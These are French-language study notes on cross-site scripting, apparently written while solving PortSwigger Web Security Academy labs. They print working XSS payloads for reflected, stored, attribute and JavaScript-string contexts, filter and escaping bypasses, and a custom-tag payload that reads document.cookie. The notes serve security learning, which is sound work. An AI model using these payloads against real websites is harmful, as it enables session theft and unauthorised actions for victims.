#### Les types de Xss
**Reflected Xss** (The malicious script comes from the current HTTP request)
```
`https://insecure-website.com/status?message=All+is+well.
<p>Status: All is well.</p>`
```
```
`https://insecure-website.com/status?message=<script>alert(1)</script>
<p>Ooops</p> (execute le JS)
```

**Stored Xss** (The malicious script comes from the website's database)
Comme reflected mais la données est enregistré dans la bdd (et potentiellement d'autre utilisateur peuvent être victime sans même cliquer sur un lien).

**DOM-based Xss** (The vulnerability exists in client-side code rather than server-side code)
C'est quand l'attaque se passe uniquement coté client :
```
`var search = document.getElementById('search').value;
var results = document.getElementById('results');
results.innerHTML = 'You searched for: ' + search;`
```
Si le paramêtre search est dans l'url l'attaquant peut construire une url malveillante commande dans la reflected xss.

---

#### Pourquoi faire ???
- Si le **http only** est pas activé on peu voler le cookie de session
- On peu trigger des actions à la place de l'utilisateur
- Faire du deface temporaire (pourquoi faire ? (je sais pas trop))

#### Http only ?
Empêche le javascript d'accéder au cookie. (~~document.cookie~~)

#### CSP (Content security policy)
C'est un header http qui permet d'éviter les attaques Xss on n'acceptant les script qu'en provenance d'une source par exemple. Parfois il est pas bien config et on peu le bypass.

#### Prévenir
- Filter (htmlspecialchars)
- CSP bien config (https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

---
---
## XSS between HTML tags

On va s’intéresser au cas ou l'entrée utilisateur est placé entre deux tag html.

### Lab: Reflected XSS into HTML context with nothing encoded
Bon là il y a juste aucune protection :
```
https://0a0400c00463f01a8006671000b10065.web-security-academy.net/?search=<script>alert(1)</script>
```

### Lab: Reflected XSS into HTML context with most tags and attributes blocked

On va d'abord chercher un tag qui est accepté :

 ```
 <script> # "Tag is not allowed"
 ```

```
<script x> # Je test un bypass
```
(ça fonctionne pas  "Tag is not allowed")

```
<img> # "Tag is not allowed"
```

Bon tout tester à la main c'est pas forcement agréable on va essayer d'automatiser tout ça :
On va utiliser l'intruder de burp suite avec la liste de tout les tags possible (https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

-> La réponse avec ``<body>`` fonctionne ! (taille différente et réponse 200 OK).

Maintenant il faut trouver un attribut autorisé :
```
<body onerror=""> # "Attribute is not allowed"
```

Même technique qu'avant mais pour l'attribut.
Il y en a plusieurs qui fonctionne par exemple `oncontentvisibilityautostatechange(hidden)=""`
`oncancel=""`
`onresize=""`

J'en ai essayé quelque un qui correspondait pas dutout (par exemple le oncancel c'est quand on ferme une balise dialog (hors elle est interdite)).

Mais le onresize c'est parfait car on a juste à changer la taille de la fenetre et ça fonctionne !

```
<body onresize=print()>
```

L'idée après c'est de pas attendre une action de l'utilisateur donc on utilise une page que l'on contrôle pour générer charger la page dans une iframe que l'on redimensionne automatiquement. Voila le payload final sur l'exploit serveur :
```
<iframesrc="https://0a38005104472d3a801e7145004d0095.web-security-academy.net/?search="><body onresize=print()>"onload=this.style.width='100px'>
```

### Lab: Reflected XSS into HTML context with all tags blocked except custom ones

Grâce à cette ressource : https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting#custom-tags (c'est littéralement le même payload que pour le chall (l'oeuf ou la poule ???))

J'apprend qu'on peu crée des tag html 'maison' et que l'attribut on focus (lorsque l'url contient un # sur l'id de l'élément courant, permet de déclencher du js.

```
search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x
```

*tabindex* permet de rendre l'élémenet focusable

Pareil que pour le dernier chall il faut l'envoyer à la victime via l'exploit serveur, ça fonctionne à environs 1 fois sur 15 (en changeant rien au payload) c'est pas ouf.

### Lab: Reflected XSS with some SVG markup allowed
Tout les tags sont bloqué sauf svg.

Pour les events on va tous les tester avec intruder. on voit que onbegin est autorisé mais avec juste svg comme tag ça fonctionne pas :
```
<svg><animate onbegin=alert(1) attributeName=x dur=1s> # le tag animate est bloqué
```

On test des combinaissons différente à partir de la cheat sheet de pprtswigger et finalement ce payload fonctionne :
```
<svg><animatetransform onbegin=alert(1) attributeName=transform>
```
tag autorisé : 
- svg
- animatetransform
attribut autorisé :
- onbegin
- attributeName

C'est un peu random mais c'est aussi le but du challenge de voir plein de config possible et de trouver une método pour trouve rapidement une piste.

### Lab: Reflected XSS with event handlers and `href` attributes blocked
Apparement tout les event sont bloqué ainsi que href.

On à le droit d'utiliser la balise ``<a>``
href : "Attribute is not allowed" effectivement...
onerror : "Event is not allowed" moueee.....

## XSS in HTML tag attributes

On va s’intéresser au cas ou l'entrée utilisateur est placé dans l'attribut d'un tag :
```
<input value="<?php echo $_GET['q']; ?>">
```
Exemple d'Xss `q=" onmouseover="alert('XSS')"`
```
<input value="" onmouseover="alert('XSS')">
```
On a fermé l'attribut value et on en crée un autre ! Yipiiie !!!

### Lab: Reflected XSS into attribute with angle brackets HTML-encoded

On rentre "userinput" pour voir ou il est utilisé dans le code

```
<h1>0 search results for 'userinput'</h1>
```
Vue le titre est le context du challenge on image qu'il y aura rien au niveau du h1 (puisqu'il veulent nous faire travailler sur les attributes).

En revanche ici :
```
<input type=text placeholder='Search the blog...' name=search value="userinput">
```
on devrait pouvoir manipuler l'attribut value.

`" onmouseover="alert('XSS') x="` <-- ça fonctionne !!! YIPIIIIEEEE

```
<input type=text placeholder='Search the blog...' name=search value="" onmouseover="alert('XSS') x="">
```

*Le x="" sert juste à fermer le " initial de value.*

### Lab: Stored XSS into anchor `href` attribute with double quotes HTML-encoded

Dans la section comment quand on rentre un lien pour référencer notre website on voit que notre input est traité comme ceci : (userinput3)
```
<a id="author" href="userinput3>userinput2</a>
```

Nous pouvons utiliser le pseudo-protocole `javascript` pour exécuter le script directement dans le href :
```
javascript:alert(document.domain)
```

```
<a id="author" href="javascript:alert(document.domain)">toto</a>
```

### Lab: Reflected XSS in canonical link tag
Un lien canonical permet de signaler au moteur de recherche comme google la page d'origine. Une page web peut être accessible à ces URL différentes :
    - `https://example.com/page`
    - `https://example.com/page?ref=promo`
    - `https://example.com/page/index.html`

Sans lien canonical, Google pourrait considérer ces trois URL comme trois pages distinctes avec du contenu dupliqué (ça améliore le SEO).

`<link rel="canonical" href="https://example.com/page">`

```
<a id="author" href="https://userinput3.com">
```

Pas compris ce qu'il fallait faire pour celui là. Je réessayerais plus tard.

## XSS into JavaScript
Parfois le contexte de l'injection Xss peut-être dans le script js :
```
<script>
var input = 'userinput';
</script>
```

Dans ce cas on peu juste fermet la balise courante pour mettre ce que l'on veut :
`</script><img src=1 onerror=alert(document.domain)>`

ça fonctionne car le navigateur parse d'abord le html avant le javascript et donc même si le script JS va potentiellement être cassé ce qu'il y a dans le onerror de notre image va être executé.

### Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped

Les `'` sont transformer en `\'` (backslash escaped) ce qui va nous empêcher de faire des payloads du type `'; alert(1)`

Cette input fonctionne :
`</script><img src=1 onerror=alert(1)>`

Celui là aussi :
`</script><script>alert(1)</script>` (plus propre)

### Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded
```
var searchTerms = 'userinput';
```

`';alert(1);var a ='`

```
var searchTerms = '';
alert(1);
var a ='';
```

ça fonctionne ! :)

### Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

Comme dit plus haut certainne protection font que les `'` sont transformer en `\'` (backslash escaped) ce qui va nous empêcher de faire des payloads du type `'; alert(1)`.

L'idée c'est que le ' soit interprété littéralement et pas comme la fin de la string.

MAIS on peut les prendre à leur propre jeux on échappant que \ avec un autre \ pour que le \ soit interprété littéralement. WOW

Cours de portswigger :

For example, suppose that the input:

`';alert(document.domain)//`

gets converted to:

`\';alert(document.domain)//`

You can now use the alternative payload:

`\';alert(document.domain)//`

which gets converted to:

`\\';alert(document.domain)//`

Here, the first backslash means that the second backslash is interpreted literally, and not as a special character. This means that the quote is now interpreted as a string terminator, and so the attack succeeds.

Dans le chall on voit effectivement que c'est le cas :

```
var searchTerms = 'aaa\'ooo';
```

Et ça fonctionne avec ce payload comme prévu : `\';alert()//`

### Lab: Reflected XSS in a JavaScript URL with some characters blocked
`<a id="author" href="https://usercontent3.com">`

